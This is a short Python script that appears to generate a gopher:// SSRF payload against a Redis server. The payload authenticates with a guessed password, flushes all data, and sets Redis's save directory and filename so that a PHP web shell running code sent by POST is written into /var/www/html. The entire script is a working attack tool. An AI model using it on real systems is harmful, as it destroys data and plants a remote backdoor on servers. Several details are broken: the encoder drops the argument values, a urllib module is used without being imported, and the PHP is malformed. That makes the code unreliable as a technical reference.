import requests
import urllib.parse

protocol = "gopher://"
ip = "0.0.0.0"
port = "6379"
shell = "\n\n<?php $eval($_POST[name])?>\n\n"
filename = "shell.php"
path = "/var/www/html"
passwd = "root"

cmd = ["flushall",
    "set 1 {}".format(shell.replace(' ',r'${IFS}')),
    "config set dir {}".format(path),
    "config set dbfilename {}".format(filename),
    "save"
]

if passwd:
    cmd.insert(0,"auth {}".format(passwd))

payload = protocol+ip+":"+port+"/_"

def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(' ')
    cmd = ""
    cmd += "*"+str(len(redis_arr))

    for x in redis_arr:
        cmd += CRLF+"$"+str(len(x.replace(r'${IFS}',' ')))
    cmd += CRLF
    return cmd 

if __name__=="__main__":
	for x in cmd:
		payload += urllib.request.quote(redis_format(x))
	print(payload)